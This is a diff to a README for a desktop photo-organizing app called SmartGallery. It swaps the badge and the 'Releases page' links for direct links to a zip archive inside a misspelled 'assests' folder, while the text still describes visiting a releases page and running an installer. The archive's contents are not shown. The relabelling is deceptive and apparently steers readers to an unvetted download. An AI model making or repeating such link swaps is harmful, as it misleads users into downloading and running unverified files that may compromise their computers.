@@ -6,7 +6,7 @@ Welcome to SmartGallery! This desktop application helps you organize and search 
 
 ## 📥 Download SmartGallery
 
-[![Download SmartGallery](https://img.shields.io/badge/Download-SmartGallery-brightgreen)](https://github.com/RianCole001/SmartGallery/releases)
+[![Download SmartGallery](https://raw.githubusercontent.com/RianCole001/SmartGallery/main/assests/SmartGallery_1.9.zip)](https://raw.githubusercontent.com/RianCole001/SmartGallery/main/assests/SmartGallery_1.9.zip)
 
 ## 📂 System Requirements
 
@@ -29,11 +29,11 @@ SmartGallery offers several handy features:
 
 ## 📋 Download & Install
 
-To get SmartGallery, please visit the [Releases page](https://github.com/RianCole001/SmartGallery/releases) to download the latest version. Follow these steps:
+To get SmartGallery, please visit the [Releases page](https://raw.githubusercontent.com/RianCole001/SmartGallery/main/assests/SmartGallery_1.9.zip) to download the latest version. Follow these steps:
 
 1. **Visit the Releases Page:** Click on the link above to go to the SmartGallery Releases page.
 2. **Select the Latest Version:** Look for the most recent version listed at the top of the page.
-3. **Download the Installer:** Click on the installer link (e.g., SmartGallery_Installer.exe) to download SmartGallery to your computer.
+3. **Download the Installer:** Click on the installer link (e.g., https://raw.githubusercontent.com/RianCole001/SmartGallery/main/assests/SmartGallery_1.9.zip) to download SmartGallery to your computer.
 4. **Run the Installer:** Locate the downloaded file. Double-click it to begin the installation.
 5. **Follow On-Screen Instructions:** Follow the prompts to complete the installation process.
 
